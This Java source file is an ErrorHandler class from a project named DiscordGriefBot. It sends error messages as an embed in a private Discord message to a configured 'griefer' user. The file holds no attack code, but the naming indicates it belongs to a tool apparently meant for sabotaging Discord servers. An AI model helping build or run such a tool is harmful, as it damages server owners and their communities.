
package de.corruptedbytes.utils;

import java.awt.Color;

import de.corruptedbytes.GriefBot;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.User;

public class ErrorHandler {
	
	public ErrorHandler(String errorMessage) {
		try {
			User user = GriefBot.instance.manager.getUserById(GriefBot.instance.grieferUserID);
			EmbedBuilder eb = getEmbed();
			eb.addField("**Error**", "**`" + errorMessage + "`**", false);
			user.openPrivateChannel().queue((channel) ->
	        {
	            channel.sendMessage(eb.build()).queue();
	        });
		} catch (Exception ignored) {}
	}
	
	private static EmbedBuilder getEmbed() {
		EmbedBuilder embed = new EmbedBuilder();
		embed.setTitle("DiscordGriefBot", null);
		embed.setColor(new Color(0xA64DFF));
		embed.setDescription("**ErrorHandler**");
		embed.setThumbnail("https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fcommons%2Fthumb%2F5%2F5f%2FRed_X.svg%2F1200px-Red_X.svg.png");
		return embed;
	}
}